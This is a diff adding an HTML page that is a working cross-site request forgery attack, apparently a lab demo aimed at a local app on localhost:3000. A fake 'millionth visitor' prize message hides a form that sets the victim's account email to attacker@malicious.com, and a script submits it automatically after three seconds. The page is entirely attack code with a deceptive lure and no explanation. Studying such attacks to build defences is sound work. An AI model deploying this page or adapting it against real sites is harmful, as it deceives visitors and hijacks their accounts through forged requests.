@@ -1,0 +1,15 @@
+<body> 
+    <h1>You are the 1,000,000th Visitor!</h1>
+    <p>Loading your prize... (Sending request in 3 seconds)</p>
+
+    <form id="csrf-form" action="http://localhost:3000/update-email" method="POST" style="display:none;">
+        <input type="hidden" name="new_email" value="attacker@malicious.com">
+    </form>
+
+    <script>
+        // Wait 3 seconds to actually see the "malicious" page (it wasn't showing up otherwise)
+        setTimeout(() => {
+            document.getElementById('csrf-form').submit();
+        }, 3000);
+    </script>
+</body>
